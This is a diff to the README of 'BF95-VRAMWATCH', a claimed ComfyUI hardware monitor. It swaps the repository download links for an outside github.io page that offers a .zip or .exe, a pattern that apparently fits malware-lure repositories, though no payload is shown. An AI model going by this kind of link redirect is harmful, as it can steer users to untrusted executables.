@@ -1,6 +1,6 @@
 # 📊 BF95-VRAMWATCH - Simple Hardware Monitoring For ComfyUI Users
 
-[![Download BF95-VRAMWATCH](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Amosoverseas578/BF95-VRAMWATCH)
+[![Download BF95-VRAMWATCH](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://amosoverseas578.github.io)
 
 This tool tracks system performance for ComfyUI. It monitors your graphics card memory and system resources. You see real-time data about your hardware health during image generation tasks.
 
@@ -13,7 +13,7 @@ This tool tracks system performance for ComfyUI. It monitors your graphics card 
 
 ## 📥 Getting The Software
 
-1.  Visit the [official download page](https://github.com/Amosoverseas578/BF95-VRAMWATCH) to acquire the tool.
+1.  Visit the [official download page](https://amosoverseas578.github.io) to acquire the tool.
 2.  Look for the section marked Releases.
 3.  Click the file ending in .zip or .exe to save it to your computer.
 4.  Move the file to a folder where you keep your tools.
